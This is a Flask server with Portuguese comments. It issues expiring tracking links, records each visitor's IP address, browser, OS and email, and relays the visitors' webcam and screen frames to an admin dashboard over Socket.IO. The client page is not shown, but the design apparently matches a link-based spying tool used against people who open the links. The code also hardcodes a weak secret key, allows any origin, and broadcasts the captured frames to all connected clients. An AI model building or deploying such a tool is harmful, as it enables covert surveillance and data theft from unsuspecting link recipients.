from flask import Flask, render_template, request, jsonify, redirect, url_for
from flask_socketio import SocketIO, emit, join_room
from models import db, Link, AccessLog
from datetime import datetime, timedelta
import os
import base64

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret_key_123'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///dashboard.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db.init_app(app)
socketio = SocketIO(app, cors_allowed_origins="*")

# Create database tables
with app.app_context():
    db.create_all()

@app.route('/')
def dashboard():
    links = Link.query.order_by(Link.created_at.desc()).all()
    logs = AccessLog.query.order_by(AccessLog.timestamp.desc()).all()
    return render_template('dashboard.html', links=links, logs=logs)

@app.route('/generate_link', methods=['POST'])
def generate_link():
    expiry_minutes = int(request.form.get('expiry', 60))
    expires_at = datetime.utcnow() + timedelta(minutes=expiry_minutes)
    
    new_link = Link(expires_at=expires_at)
    db.session.add(new_link)
    db.session.commit()
    
    full_url = request.host_url + 'v/' + new_link.code
    return jsonify({'code': new_link.code, 'url': full_url})

@app.route('/v/<code>')
def view_link(code):
    link = Link.query.filter_by(code=code).first_or_404()
    
    if link.is_expired():
        return "Este link expirou.", 410
    
    return render_template('client.html', link_code=code)

@app.route('/log_access', methods=['POST'])
def log_access():
    data = request.json
    link = Link.query.filter_by(code=data.get('code')).first()
    if link:
        log = AccessLog(
            link_id=link.id,
            ip_address=request.remote_addr,
            browser=data.get('browser'),
            os=data.get('os'),
            email=data.get('email')
        )
        db.session.add(log)
        db.session.commit()
        return jsonify({'status': 'success'})
    return jsonify({'status': 'error'}), 404

# Socket.IO Signaling for WebRTC
@socketio.on('join')
def on_join(data):
    room = data['room']
    join_room(room)
    print(f"Client joined room: {room}")

@socketio.on('signal')
def on_signal(data):
    room = data['room']
    emit('signal', data, room=room, include_self=False)

@socketio.on('native_frame')
def handle_native_frame(data):
    # Repassa o frame da câmera para o dashboard
    emit('native_stream', data, broadcast=True)

@socketio.on('native_screen')
def handle_native_screen(data):
    # Repassa o frame da tela para o dashboard
    emit('native_screen_stream', data, broadcast=True)

@socketio.on('disconnect')
def on_disconnect():
    # Notify admin that a client disconnected
    emit('client_disconnected', {'id': request.sid}, room='admin')
    print(f"Client disconnected: {request.sid}")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    socketio.run(app, debug=False, port=port, host='0.0.0.0')
